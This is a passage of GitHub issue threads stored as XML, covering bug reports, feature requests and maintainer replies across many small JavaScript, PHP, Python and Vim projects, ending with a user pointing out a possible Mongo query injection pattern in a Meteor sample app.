&#13;
fixes #1</Body>
    <State>open</State>
    <Comment>
      <Owner>laggingreflex</Owner>
      <Body>@gajus thoughts on this? I was also thinking maybe having only this (the short script path) without the function name. What would you say about making the function name optional, like `{functionName: false, scriptPath: true}`</Body>
    </Comment>
    <Comment>
      <Owner>gajus</Owner>
      <Body>Whats the reason for wanting to include the file name, line, column if this information is already present in the console?&#13;
&#13;
&lt;img width="640" alt="screen shot 2017-01-02 at 13 18 05" src="https://cloud.githubusercontent.com/assets/973543/21588273/ec0ac84e-d0ed-11e6-909d-277ec909fc97.png"&gt;&#13;
&#13;
As is "VM214:1" in this screenshot.</Body>
    </Comment>
    <Comment>
      <Owner>laggingreflex</Owner>
      <Body>I'm using this in Node</Body>
    </Comment>
  </Issue_28>
  <Issue_29>
    <Repository>babel-plugin-log-deprecated</Repository>
    <Title>Does not work for ES Classes</Title>
    <Owner>gajus</Owner>
    <Body>Thanks for the execellent idea and implementation. Unfortunately it does not seem with class methods in ES2015 classes. I am not sure whether this is related to the es2015 preset which is changing classes beforehand.&#13;
&#13;
Example code:&#13;
&#13;
```js&#13;
/**&#13;
 * @deprecated&#13;
 */&#13;
function oldMethod() {}&#13;
&#13;
class About extends React.Component {&#13;
  /**&#13;
   * @deprecated&#13;
   */&#13;
  oldMethod() {}&#13;
&#13;
  render() {&#13;
    return (&#13;
      &lt;p&gt;&#13;
        &lt;button className={Styles.button} onClick={oldMethod}&gt;Deprecated Test - Works&lt;/button&gt;&#13;
        &lt;button className={Styles.button} onClick={this.oldMethod}&gt;Deprecated Test - Does not work&lt;/button&gt;&#13;
      &lt;/p&gt;&#13;
    )&#13;
  }&#13;
}&#13;
```&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>swernerx</Owner>
      <Body>Testing like&#13;
&#13;
```babel --presets es2015,react --plugins log-deprecated test.js```&#13;
&#13;
Output:&#13;
&#13;
```js&#13;
/**&#13;
 * @deprecated&#13;
 */&#13;
function oldMethod() {&#13;
  console.warn("Deprecated: Function \"oldMethod\" is deprecated in test.js on line 4", {&#13;
    functionName: "oldMethod",&#13;
    message: null,&#13;
    packageName: "advanced-boilerplate",&#13;
    packageVersion: "0.14.11",&#13;
    scriptColumn: 0,&#13;
    scriptLine: 4,&#13;
    scriptPath: "test.js"&#13;
  })&#13;
}&#13;
&#13;
var About = function (_React$Component) {&#13;
  _inherits(About, _React$Component);&#13;
&#13;
  function About() {&#13;
    _classCallCheck(this, About);&#13;
&#13;
    return _possibleConstructorReturn(this, (About.__proto__ || Object.getPrototypeOf(About)).apply(this, arguments));&#13;
  }&#13;
&#13;
  _createClass(About, [{&#13;
    key: "oldMethod",&#13;
&#13;
    /**&#13;
     * @deprecated&#13;
     */&#13;
    value: function oldMethod() {}&#13;
  }, {&#13;
    key: "render",&#13;
    value: function render() {&#13;
      return React.createElement(&#13;
        "p",&#13;
        null,&#13;
        React.createElement(&#13;
          "button",&#13;
          { className: Styles.button, onClick: oldMethod },&#13;
          "Deprecated Test - Works"&#13;
        ),&#13;
        React.createElement(&#13;
          "button",&#13;
          { className: Styles.button, onClick: this.oldMethod },&#13;
          "Deprecated Test - Does not work"&#13;
        )&#13;
      );&#13;
    }&#13;
  }]);&#13;
&#13;
  return About;&#13;
}(React.Component);&#13;
```&#13;
&#13;
Babel seems to move the output to the "parent" `value` key for the function.</Body>
    </Comment>
    <Comment>
      <Owner>swernerx</Owner>
      <Body>Interestingly this is broken without the ES2015 preset as well. Okay probably there is just missing support for classes in general:&#13;
&#13;
`babel  --plugins log-deprecated --presets react test.js`&#13;
&#13;
Output: &#13;
&#13;
```js&#13;
/**&#13;
 * @deprecated&#13;
 */&#13;
function oldMethod() {&#13;
  console.warn("Deprecated: Function \"oldMethod\" is deprecated in test.js on line 4", {&#13;
    functionName: "oldMethod",&#13;
    message: null,&#13;
    packageName: "advanced-boilerplate",&#13;
    packageVersion: "0.14.11",&#13;
    scriptColumn: 0,&#13;
    scriptLine: 4,&#13;
    scriptPath: "test.js"&#13;
  })&#13;
}&#13;
&#13;
class About extends React.Component {&#13;
  /**&#13;
   * @deprecated&#13;
   */&#13;
  oldMethod() {}&#13;
&#13;
  render() {&#13;
    return React.createElement(&#13;
      "p",&#13;
      null,&#13;
      React.createElement(&#13;
        "button",&#13;
        { className: Styles.button, onClick: oldMethod },&#13;
        "Deprecated Test - Works"&#13;
      ),&#13;
      React.createElement(&#13;
        "button",&#13;
        { className: Styles.button, onClick: this.oldMethod },&#13;
        "Deprecated Test - Does not work"&#13;
      )&#13;
    );&#13;
  }&#13;
}&#13;
```</Body>
    </Comment>
  </Issue_29>
  <Issue_30>
    <Repository>babel-plugin-transform-jsx-element-to-string-literal</Repository>
    <Title>Cannot use '&lt;' lower than symbol for sql query</Title>
    <Owner>gajus</Owner>
    <Body>![screen shot 2017-07-17 at 14 56 25](https://user-images.githubusercontent.com/5404903/28257835-3b1ea868-6b00-11e7-8c3d-03dbf56fb905.png)&#13;
&#13;
this is my full query&#13;
&#13;
busListSearch = &lt;sql&gt;&#13;
SELECT SUM(bus_time), e.bus_location, e.bus_no , e.RouteStart, e.RouteEnd FROM (&#13;
SELECT r.`route_id`,  r.`current_stop` ,r.`route_start`,r.`route_end`, r.`next_stop`, r.`bus_time`, c.`current_position`,b.`bus_location`,b.bus_no, l1.`location_name` as "RouteStart",l2.`location_name` as "RouteEnd"&#13;
FROM route r&#13;
LEFT JOIN client c&#13;
ON r.`next_stop`  c.`current_position`&#13;
LEFT JOIN bus b&#13;
ON b.`bus_location` &lt;= r.`current_stop` and b.`bus_route` = 1&#13;
LEFT JOIN location l1&#13;
ON l1.`location_position` = r.`route_start`&#13;
LEFT JOIN location l2&#13;
ON l2.`location_position` = r.`route_end`&#13;
where c.`client_id` = 5 /*  */&#13;
) AS e&#13;
WHERE e.bus_no = "T304" and e.`route_id` = 1 and not e.`current_stop` in (0);&#13;
&lt;/sql&gt;; </Body>
    <State>open</State>
    <Comment>
      <Owner>khursani8</Owner>
      <Body>it seems I cannot put &lt;sql&gt; in comment, so i will just give my code screenshot&#13;
![screen shot 2017-07-17 at 14 58 51](https://user-images.githubusercontent.com/5404903/28257917-aee9889e-6b00-11e7-8c4b-82ad582fd7f5.png)&#13;
&#13;
</Body>
    </Comment>
  </Issue_30>
  <Issue_31>
    <Repository>kalliope-rest</Repository>
    <Title>proposal: include this lib as a part of current kalliope project</Title>
    <Owner>frnmst</Owner>
    <Body>Hi, &#13;
What do you think about integrating your work into kalliope project?&#13;
&#13;
It would be cool if user that have installed kalliope from pip could use this lib.&#13;
And also, we planned to refactor the current integrated GUI with something more python based.&#13;
&#13;
What do you think? I don't know if it possible to place all of his in a dedicated folder so the user could then import kalliope.lib or something like that.</Body>
    <State>open</State>
    <Comment>
      <Owner>frnmst</Owner>
      <Body>&gt; Hi,&#13;
&gt; What do you think about integrating your work into kalliope project?&#13;
&gt; &#13;
&gt; It would be cool if user that have installed kalliope from pip could use this lib.&#13;
&gt; And also, we planned to refactor the current integrated GUI with something more python based.&#13;
&#13;
Hello,&#13;
It's ok with me however I'm not sure what you mean by the current integrated GUI. If you mean CLI  instead of GUI then you probably mean this: https://github.com/kalliope-project/kalliope/blob/b3f21befaaa1b51f81ff8985de81cd48951e1a13/Docs/kalliope_cli.md&#13;
and this: https://github.com/kalliope-project/kalliope/blob/be55beadd8e880b83f52e16fd7f92d3c4cbcf060/kalliope/core/ShellGui.py&#13;
&#13;
&gt; What do you think? I don't know if it possible to place all of his in a dedicated folder so the user could then import kalliope.lib or something like that.&#13;
&#13;
That might be possible with some code refactoring...&#13;
These are the future plans for this repository: https://github.com/frnmst/todo/blob/master/todo/kalliope-rest.md . For the moment, installation can only be done with: `# make install`. As you can see there quite a lot of things to do.</Body>
    </Comment>
    <Comment>
      <Owner>Sispheor</Owner>
      <Body>Yes I mean the ShellGUI. We plan to remove / refactor it to use api call or lib like the one you made.&#13;
Anyway, this is another issue. We'll see this part later.&#13;
&#13;
An so yes, the idea would be to have the lib available when installing Kalliope from pip.&#13;
And so the user could then do a "from kalliope import sdk".&#13;
The advantage is that he lib will grow in the same time as Kalliope and its API.&#13;
&#13;
Up to you, if it's not a too big task, you can try to &#13;
- implement your lib in a dedicated folder called `sdk` inside Kalliope. Verify that you can import it once Kalliope is reinstalled via setup.py.&#13;
- implement the CLI by adding a flag into the current kalliope entry point. Like `kalliope cli &lt;command&gt;`&#13;
&#13;
Just a couple notes:&#13;
- the code must have unit tests&#13;
- support for python 2 is still mandatory until Raspbian move to Python 3 by default</Body>
    </Comment>
    <Comment>
      <Owner>frnmst</Owner>
      <Body>Ok Sispheor, &#13;
&#13;
I don't know how much time I can spend on this but I'll have a go at it. So as long there is no forthcoming deadline, it's ok...&#13;
&#13;
&gt; implement your lib in a dedicated folder called sdk inside Kalliope. Verify that you can import it once Kalliope is reinstalled via setup.py.&#13;
&#13;
Do you mean something like:&#13;
&#13;
    $ git clone https://github.com/kalliope-project/kalliope.git&#13;
    $ git clone https://github.com/frnmst/kalliope-rest.git&#13;
    $ cd kalliope&#13;
    $ mkdir sdk&#13;
    $ cp -aR ~/kalliope-rest/* sdk/&#13;
    $ python&#13;
    &gt;&gt;&gt; from kalliope import sdk&#13;
&#13;
&gt; implement the CLI by adding a flag into the current kalliope entry point. Like kalliope cli &lt;command&gt;&#13;
&#13;
Editing the `main` function in `kalliope/__init__.py` so that it works (for example) like the following:&#13;
&#13;
    $ kalliope cli exec by-audio "hello-command.wav" --voice</Body>
    </Comment>
    <Comment>
      <Owner>Sispheor</Owner>
      <Body>Yes exactly.&#13;
And also remove the .git folder from your repo. To follow your files from the main kalliope git repo only.</Body>
    </Comment>
    <Comment>
      <Owner>frnmst</Owner>
      <Body>Hello,&#13;
I haven't made much progress with kalliope-rest because I am continuing with [kalliope-docker](https://github.com/frnmst/kalliope-docker/tree/dev) first.&#13;
I hope I can get on with kalliope-rest soon, once kalliope-docker is ready.</Body>
    </Comment>
  </Issue_31>
  <Issue_32>
    <Repository>Cristina-ColorScheme</Repository>
    <Title>Scheme for Cud</Title>
    <Owner>edgarMejia</Owner>
    <Body>Hi&#13;
Nice scheme. Can you make version for CudaText editor?&#13;
http://wiki.freepascal.org/CudaText#Color_themes</Body>
    <State>open</State>
    <Comment>
      <Owner>edgarMejia</Owner>
      <Body>Hello, for the moment I'm working on a version for VS, although it wasn't in my plans a version for CudaText, I will try to do it as soon as possible.</Body>
    </Comment>
  </Issue_32>
  <Issue_33>
    <Repository>nerdtree-clip</Repository>
    <Title>Is not copying to clipboard</Title>
    <Owner>mortonfox</Owner>
    <Body>I do the command m + b on nerdTree&#13;
&#13;
the path is displayed but is not copied to clipboard&#13;
&#13;
![image](https://user-images.githubusercontent.com/32102378/57776371-a80cff80-76f5-11e9-837b-76ed50731b09.png)&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>mortonfox</Owner>
      <Body>If you change the line&#13;
&#13;
```&#13;
    let @* = path&#13;
```&#13;
&#13;
to &#13;
&#13;
```&#13;
    let @+ = path&#13;
```&#13;
&#13;
in the plugin, does that make it work?&#13;
&#13;
On my system, both the * and + registers are the same but that's not true on every system.</Body>
    </Comment>
  </Issue_33>
  <Issue_34>
    <Repository>Cachalot</Repository>
    <Title>Replace cacheKeySuffix with cacheKey</Title>
    <Owner>ihor</Owner>
    <Body>&#128077; Your idea and work are great !

I think use `cache_key` by serializing arguments to string (may be can be md5 string) is not a good idea because :
- Sometimes we passed a big object like `Dependency Container` to arguments array. It make the code slow as its missed run.
- Sometimes I want to cache result that can be returned by 2 difference callable functions

Example 

``` php
// somewhere.php
$posts1 = $cache-&gt;getCached(['PostService', 'getActive'], ['category_id' =&gt; [1,2]]);

// somewhere_else.php run after somewhere.php
$posts2 = $cache-&gt;getCached(['CategoryService', 'getAllByCategoryId'], [1, 2]);

// I want $posts2 must be got from cache storage by cacheKey='some_key' 
```

So I think it is better if we have this interface

``` php
public function getCached($callback, array $args = array(), $expireIn = 0, $cacheKey = null);
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>ihor</Owner>
      <Body>The point of this library is to simplify caching for most of the cases and automatic key generation helps it because:
1. You don't have to worry about using unique keys across the application code
2. It makes the code shorter

Tha's why I'll keep it. 

But I think replacing `$cacheKeySuffix` with a `$cacheKey` which, when it is provided, will be used instead of autogenerated key is a good idea. It is a more general solution and has more use cases.

The only problem here is backward compatibility. Let me think about it. If I don't find any solution I'll have to make a major release.

Thank you for your feedback.
</Body>
    </Comment>
    <Comment>
      <Owner>ihor</Owner>
      <Body>Btw I don't want this library to encourage your 2nd use case. It adds complexity and may provide more risks than benefits. So, unless you know what you are doing, I do not recommend that.
</Body>
    </Comment>
    <Comment>
      <Owner>khanhicetea</Owner>
      <Body>Yah, you're right ! Second case looks very risky.

Btw, if u want to release a major release for first case, I think I can help u by making a PR &#128516; 
</Body>
    </Comment>
  </Issue_34>
  <Issue_35>
    <Repository>teacozy</Repository>
    <Title>Best practices on Linking &amp; File management</Title>
    <Owner>tvnisp</Owner>
    <Body>&#13;
&#13;
_Very cool use of local file paths_ for your local project assets for easy access and offline use, for further reading here are two excellent resources on dealing with files and linking to file paths &#128516; https://developer.mozilla.org/en-US/docs/Learn/Getting_started_with_the_web/Dealing_with_files&#8232;&#8232;&#13;
&#13;
https://www.kirupa.com/html5/all_about_file_paths.htm&#8232;&#13;
&#13;
This also goes for your background-images in the css document instead of relying on separate web URL links coming from different servers &#13;
&#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>tommygebru</Owner>
      <Body>&#13;
&#13;
Also as you begin to use local file paths, make sure to become familiar with relative vs absolute file paths&#13;
**Relative file paths,** will secure the project assets and make them viewable anywhere &#13;
&#13;
**Absolute file paths,** will require that a specific domain name or url to access and view the documents&#13;
&#13;
You can review these concepts further here &#13;
https://www.coffeecup.com/help/articles/absolute-vs-relative-pathslinks/</Body>
    </Comment>
  </Issue_35>
  <Issue_36>
    <Repository>teacozy</Repository>
    <Title>Best practices on Formatting &amp; Commenting</Title>
    <Owner>tvnisp</Owner>
    <Body>&#13;
&#13;
&#13;
 _Great use of commenting in both_ your HTML and CSS documents, this provides a high-level of organization and note-taking. &#128064; &#13;
&#13;
Introduce more clarity early at the beginning of your project to create a guideline and narrative.&#13;
As you build out more complex webpages and projects, comments can help break down sections and problem solve.&#13;
&#13;
&#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>tommygebru</Owner>
      <Body>&#13;
&#13;
&#13;
_Nice work formatting your code with indentation_ another great way to improve readability. &#128064; Indenting your code also helps point out the nested elements, and distinguish between parent/child elements.&#13;
&#13;
Below I wrote an example of the nest/wrap relationship, another name for it would be the parent/child relationship.&#13;
```&#13;
 &lt;div class="wrapping"&gt;&#13;
  &lt;p class="nesting"&gt;&lt;/p&gt; &#13;
  &lt;p class="nesting"&gt;&lt;/p&gt;&#13;
 &lt;/div&gt;&#13;
```&#13;
or&#13;
```&#13;
 &lt;div class="parent"&gt;&#13;
  &lt;p class="children"&gt;&lt;/p&gt; &#13;
  &lt;p class="children"&gt;&lt;/p&gt;&#13;
 &lt;/div&gt;&#13;
```</Body>
    </Comment>
  </Issue_36>
  <Issue_37>
    <Repository>mnode</Repository>
    <Title>does this work with node .8?</Title>
    <Owner>arunoda</Owner>
    <Body>node 0.8.25, using this tool gives me:

&lt;pre&gt;
&gt; mnode

buffer.js:440
      throw new Error('Unknown encoding');
            ^
Error: Unknown encoding
    at Buffer.toString (buffer.js:440:13)
    at Object.fs.readFileSync (fs.js:236:33)
    at getMeteoriteNode (/Users/bret/.nvm/v0.8.25/lib/node_modules/mnode/index.js:37:33)
    at Object.&lt;anonymous&gt; (/Users/bret/.nvm/v0.8.25/lib/node_modules/mnode/index.js:8:15)
    at Module._compile (module.js:449:26)
    at Object.Module._extensions..js (module.js:467:10)
    at Module.load (module.js:356:32)
    at Function.Module._load (module.js:312:12)
    at Module.runMain (module.js:492:10)
    at process.startup.processNextTick.process._tickCallback (node.js:245:9)
&lt;/pre&gt;
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>This should work. I submit a bug report here: https://github.com/joyent/node/issues/4989#issuecomment-22432578

Can you just change the node version and try a bit.
</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Try the version in the npm: `0.1.1`
</Body>
    </Comment>
  </Issue_37>
  <Issue_38>
    <Repository>travis-ci-laika</Repository>
    <Title>Should we run a separate MongoDB instance or not?</Title>
    <Owner>arunoda</Owner>
    <Body>In laika documentation you are talking about separate MongoDB instance, but in `.travis.yaml` file there is no MongoDB service defined or used? Is it needed then or what?
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Yes. We've to.
</Body>
    </Comment>
    <Comment>
      <Owner>mitar</Owner>
      <Body>It does not work with one provided by Meteor? It seems it work? -&gt; Based on your `.travis.yaml`. :-)
</Body>
    </Comment>
  </Issue_38>
  <Issue_39>
    <Repository>data-behaviors</Repository>
    <Title>Ted.js - better file watching</Title>
    <Owner>Marak</Owner>
    <Body>Ted's current directory watcher is not ideal. We are using nodes sync filewatcher api on several nested files and directories in a loop. We are also unwatching these same items with the sync filewatcher.

There is a bit of an OS race condition here with MacOS's filesystem and the file watcher which is currently being solved with a forced delay. I think if we switch to the macs native FSEvents (http://en.wikipedia.org/wiki/FSEvents) we'll get much better performance and response time from Ted.
</Body>
    <State>open</State>
    <Comment>
      <Owner>Marak</Owner>
      <Body>There also seems to be an issue when creating new folders and new files that causing a double bind to occur. I think a directory might be being watched but not unwatched? not entirely sure why its double binding. we should switch to FSEvents first perhaps and then track down this problem 
</Body>
    </Comment>
  </Issue_39>
  <Issue_40>
    <Repository>xp</Repository>
    <Title>Add process.stdin and out support so you can pipe data in and out of xp calls </Title>
    <Owner>Marak</Owner>
    <Body>We should be able to make calls like:

```
echo "foobar" | xp base64 
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>tanepiper</Owner>
      <Body>+1 would be good to be able to cat in files, both text and binary such as png files and be able to output as base64 for dataurl stuff.
</Body>
    </Comment>
    <Comment>
      <Owner>Marak</Owner>
      <Body>Should be easy to add, I just didn't have time to squeeze it in the first release.
</Body>
    </Comment>
  </Issue_40>
  <Issue_41>
    <Repository>zalgo.js</Repository>
    <Title>Make it a command line tool, and rmv archaisms like require('sys')</Title>
    <Owner>Marak</Owner>
    <Body>Rewritten in a more functional style.
</Body>
    <State>open</State>
    <Comment>
      <Owner>jorgechamorro</Owner>
      <Body>Hey Marak, don't abandon this jewel !
</Body>
    </Comment>
  </Issue_41>
  <Issue_42>
    <Repository>supersimple-editor.js</Repository>
    <Title>When Ctrl combination is pressed, b key can't be pressed</Title>
    <Owner>rehno-lindeque</Owner>
    <Body>For example `Ctrl`+`v` followed by `b` does not register a keystroke
</Body>
    <State>open</State>
    <Comment>
      <Owner>rehno-lindeque</Owner>
      <Body>Actually might solve this by doing the reformatting text on key events instead of trying to block keystrokes...
</Body>
    </Comment>
  </Issue_42>
  <Issue_43>
    <Repository>MusicBoxCore</Repository>
    <Title>Missing doc.secret for some operations</Title>
    <Owner>tomplays</Owner>
    <Body>some CRUD operations can be edited without doc.secret .. 
</Body>
    <State>open</State>
    <Comment>
      <Owner>tomplays</Owner>
      <Body>added in some functions but still not complete
</Body>
    </Comment>
  </Issue_43>
  <Issue_44>
    <Repository>eComm</Repository>
    <Title>decrypt without firefox extension</Title>
    <Owner>diegocr</Owner>
    <Body>Hi @diegocr 
how one would decrypt the text without a firefox/chrome extension?
Could you please provide an openssl command to decrypt text encrypted by your app?

Thank you.
</Body>
    <State>open</State>
    <Comment>
      <Owner>diegocr</Owner>
      <Body>Hi @jozic

It should be possible indeed, but i'm not sure if openssl is enough.

Probably a tiny bash script using a few commands could do it, i can try to do some experiments once i have some spare time for this.

Cheers.
</Body>
    </Comment>
    <Comment>
      <Owner>jozic</Owner>
      <Body>That would be great. 
Thanks!
</Body>
    </Comment>
  </Issue_44>
  <Issue_45>
    <Repository>YGRip</Repository>
    <Title>Does not compile on Debian 7</Title>
    <Owner>diegocr</Owner>
    <Body>I know this software has probably been abandoned, but there are some Yahoo groups I want to archive and I can't seem to get this software to compile. It seems to be written for AmigaOS?
</Body>
    <State>open</State>
    <Comment>
      <Owner>diegocr</Owner>
      <Body>Yeah, it was originally written for AmigaOS, but i don't see why it shouldn't work on other platforms if you are brave enough to port it - the command-line interface only I mean, obviously.

For example, i'd start creating a debian.h and debian.c files to implement wrappers for everything:

APTR -&gt; void
ULONG -&gt; unsigned long
etc
Open() -&gt; fopen()
AllocVec() -&gt; malloc()
etc

Further API reference at http://amiga.sourceforge.net/amigadevhelp/

Cheers.
</Body>
    </Comment>
  </Issue_45>
  <Issue_46>
    <Repository>babel-preset-es2040</Repository>
    <Title>Add transform-object-rest-spread</Title>
    <Owner>ahdinosaur</Owner>
    <Body>- http://babeljs.io/docs/plugins/transform-object-rest-spread/
- Examples: http://redux.js.org/docs/recipes/UsingObjectSpreadOperator.html

One of the most useful utilities of the spread operator is the ease of updating objects without mutation.

```
{ ...prev, key: newVal }
```

I created this issue in case it was merely an oversight that this plugin is missing. If it was left out deliberately, then it's no big deal for me to add the plugin myself. It just seems fitting for es2040 to support this since it supports the rest of the spread operator's uses.
</Body>
    <State>open</State>
    <Comment>
      <Owner>ahdinosaur</Owner>
      <Body>hey @danneu, thanks for the suggestion. :cat:

i'm on the fence about this feature, on the one hand i appreciate an easy way to extend objects with a consistent (but not necessarily familiar) syntax, on the other hand i know that this can easily be done using [`xtend`](https://github.com/Raynos/xtend) (which is not necessarily true of the array rest / spread operators that include craziness with `[].slice.call(arguments)` and `fn.apply(args)`).

i'm leaning towards a yes, as i do want to support features which benefit functional programming without adding unnecessary complexity.

@pietgeursen, i know you use this, any opinions?
</Body>
    </Comment>
    <Comment>
      <Owner>ahdinosaur</Owner>
      <Body>update: i'm keen to add this feature as soon as a Long-Term Stable version of node is released that includes this feature.&#13;
&#13;
it seems [Node@8 does support this](https://www.zaiste.net/posts/whats_new_in_node_8/)? so maybe once that version becomes LTS i'd be happy to merge a pull request for this.</Body>
    </Comment>
  </Issue_46>
  <Issue_47>
    <Repository>contributing</Repository>
    <Title>how to format list of contributors</Title>
    <Owner>ahdinosaur</Owner>
    <Body>possible option:

``` yml
- ahdinosaur:
  name: Michael Williams
   ...
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>ahdinosaur</Owner>
      <Body>another option is to embed the contributors directly in the [package.json](https://www.npmjs.org/doc/files/package.json.html#people-fields-author-contributors). i like this option. :)
</Body>
    </Comment>
    <Comment>
      <Owner>ahdinosaur</Owner>
      <Body>https://github.com/GNS3/cla does this as a directory of files per contributor, which enables each contributor to include a full disclaimer etc about what they are legally agreeing to.</Body>
    </Comment>
  </Issue_47>
  <Issue_48>
    <Repository>meta</Repository>
    <Title>"Workers of Open Source, Unite!" blog post</Title>
    <Owner>ahdinosaur</Owner>
    <Body>use this issue to discuss the blog post ["Workers of Open Source, Unite"](https://blog.dinosaur.is/workers-of-open-source-unite/) :)
</Body>
    <State>open</State>
    <Comment>
      <Owner>bhaugen</Owner>
      <Body>Beyond awesome! 
</Body>
    </Comment>
  </Issue_48>
  <Issue_49>
    <Repository>meteor-schema-form</Repository>
    <Title>Comparison with autoform</Title>
    <Owner>ahdinosaur</Owner>
    <Body>Is this package still relevant, now that https://atmospherejs.com/aldeed/autoform exists?
</Body>
    <State>open</State>
    <Comment>
      <Owner>ahdinosaur</Owner>
      <Body>i'm pretty sure that existed when i started this package, my motivation was to use [json-schema](http://json-schema.org) and [jsonform](https://github.com/joshfire/jsonform) instead of implementing my own schema language and form generator, but i've long since abandoned this package and meteor.
</Body>
    </Comment>
  </Issue_49>
  <Issue_50>
    <Repository>pull-async</Repository>
    <Title>cb with a stream</Title>
    <Owner>ahdinosaur</Owner>
    <Body>https://github.com/dominictarr/pull-stream-examples/issues/2#issuecomment-236400756
made be realize that our way to handle async stream creation is too obscure.

sometimes you need to return sync, but need to do something async before you can create a stream.
maybe pull-async is a more obvious interface for this, adjusted slightly so you can return a stream?

``` js
pull(
  async(function (cb) { fs.readdir(dir, function (err, ls) {
    cb(err, pull.values(ls))
  }),
  pull.drain(console.log)
)
```

or is it just that the pull-defer docs don't make it's purpose obvious enough?
</Body>
    <State>open</State>
    <Comment>
      <Owner>ahdinosaur</Owner>
      <Body>hey @dominictarr, yeah i've been wondering about if `pull-async` were to support returning a stream, which means this just becomes a wrapper on top of `pull-defer`. i do think we need better docs to describe common use cases, as the `pull-defer` docs are not obvious if you stumble upon them without context, although i think the api seems generally useful.
</Body>
    </Comment>
  </Issue_50>
  <Issue_51>
    <Repository>express-cljs-starter</Repository>
    <Title>extract the "utility" out of here and into a library of it's own</Title>
    <Owner>naartjie</Owner>
    <Body>so things like `defroute` from #2 would live in this library
</Body>
    <State>open</State>
    <Comment>
      <Owner>naartjie</Owner>
      <Body>Alternatively a lein template, but if there is enough stuff in here, might be better for an express cljs lib, and a node lein template.
</Body>
    </Comment>
  </Issue_51>
  <Issue_52>
    <Repository>fastai-shell</Repository>
    <Title>how can I make sure that fastai create is creating a v100 instance instead of k80?</Title>
    <Owner>arunoda</Owner>
    <Body> - The resource 'projects/machine-learning-khm/zones/europe-west4-a/acceleratorTypes/nvidia-tesla-k80' was not found&#13;
&#13;
Don't know how to tackle this</Body>
    <State>open</State>
    <Comment>
      <Owner>kamalhm</Owner>
      <Body>edit.&#13;
&#13;
this is happened when I tried to do&#13;
`fastai create`&#13;
&#13;
not when I can choose the gpu after I do `fastai start`</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Could you select a different zone for now. Somewhere in us-west. &#13;
&#13;
Check readme on how to do that. &#13;
This is a bug. I will fix it. </Body>
    </Comment>
    <Comment>
      <Owner>kamalhm</Owner>
      <Body>Yeah I think I managed a workaround by doing `fastai create` in k80, then switch, move to v100</Body>
    </Comment>
    <Comment>
      <Owner>kamalhm</Owner>
      <Body>also,  is it possible to make an option to switch to jupyter lab instead?</Body>
    </Comment>
    <Comment>
      <Owner>kamalhm</Owner>
      <Body>turns out my workaround is not perfect after all, I get into an error when I try to create a new notebook.&#13;
&#13;
This happen &#13;
`installing: mkl_random-1.0.1-py37h4414c95_1 ...&#13;
installing: numpy-1.15.1-py37h1d66e8a_0 ...&#13;
installing: numba-0.39.0-py37h04863e7_0 ...&#13;
installing: numexpr-2.6.8-py37hd89afb7_0 ...&#13;
installing: pandas-0.23.4-py37h04863e7_0 ...&#13;
installing: pytest-arraydiff-0.2-py37h39e3cac_0 ...&#13;
installing: pytest-doctestplus-0.1.3-py37_0 ...&#13;
installing: pywavelets-1.0.0-py37hdd07704_0 ...&#13;
installing: scipy-1.1.0-py37hfa4b5c9_1 ...&#13;
installing: bkcharts-0.2-py37_0 ...&#13;
installing: dask-0.19.1-py37_0 ...&#13;
installing: patsy-0.5.0-py37_0 ...&#13;
installing: pytables-3.4.4-py37ha205bf6_0 ...&#13;
installing: pytest-astropy-0.4.0-py37_0 ...&#13;
installing: scikit-image-0.14.0-py37hf484d3e_1 ...&#13;
installing: scikit-learn-0.19.2-py37h4989274_0 ...&#13;
installing: astropy-3.0.4-py37h14c3975_0 ...&#13;
installing: odo-0.5.1-py37_0 ...&#13;
installing: statsmodels-0.9.0-py37h035aef0_0 ...&#13;
installing: blaze-0.11.3-py37_0 ...&#13;
installing: seaborn-0.9.0-py37_0 ...&#13;
installing: anaconda-5.3.1-py37_0 ...&#13;
installation finished.&#13;
Deleting anaconda file&#13;
Adding to .bashrc&#13;
Sourcing .bashrc&#13;
DONE! :)&#13;
&#13;
&#13;
**bash: line 46: python: command not found**&#13;
&#13;
&#13;
Solving environment: done`&#13;
&#13;
an error happened when installing Anaconda. &#13;
&#13;
maybe it's the cause of this error that I encounter&#13;
https://pasteboard.co/HPlHNvR.png</Body>
    </Comment>
    <Comment>
      <Owner>kamalhm</Owner>
      <Body>I got it working smoothly now, dunno what happen but I chose another zone and reinstall.&#13;
&#13;
Another question, how can I upload data to my persistent storage? Also, is it viable to increase the 50GB SSD limit?</Body>
    </Comment>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>@kamalhm It's possible.&#13;
But currently you have to edit the local copy of your fastai-shell to change this: https://github.com/arunoda/fastai-shell/blob/master/fastai.sh#L91&#13;
&#13;
Local copy is in `~/.fastai/bin/fastai`&#13;
&#13;
After that you have to start from scratch.&#13;
&#13;
But we can have a command like this:&#13;
&#13;
```&#13;
fastai resize-disk 100GB&#13;
```</Body>
    </Comment>
    <Comment>
      <Owner>kamalhm</Owner>
      <Body>I see. Shouldn't I be changing this one too ? https://github.com/arunoda/fastai-shell/blob/master/fastai.sh#L208.&#13;
&#13;
another question, when looking at my quotas page, I should have a location in asia that has v100 pre-emptible GPU available to me, but when I do fastai list zone, asia-east-1 is not shown, why? &#13;
This fastai shell is amazing though, it's very promising and I would like to make a feature request if you don't mind</Body>
    </Comment>
  </Issue_52>
  <Issue_53>
    <Repository>hello-react-meteor</Repository>
    <Title>Security issue in post_list.jsx</Title>
    <Owner>arunoda</Owner>
    <Body>These two lines in post_list.jsx seem a bit insecure and basically crying for a "Mongo-injection", well actually it is a Mongo query injection :) It would be possible for the client to change `{category: {$ne: "private"}}`to `{category: "private"}` and get all private posts, or?

`var selector = {category: {$ne: "private"}};`
`var handle = Meteor.subscribe('posts', selector);`

This code seems to run on both client and server, so maybe the server part will override and prevent the client from doing bad things, but in general it feels bad to have a potentially insecure pattern in a sample app that might inspire others to use those subscription patterns outside of React in pure client code.
</Body>
    <State>open</State>
    <Comment>
      <Owner>arunoda</Owner>
      <Body>Yep. Good idea. I just want to do some filtering.
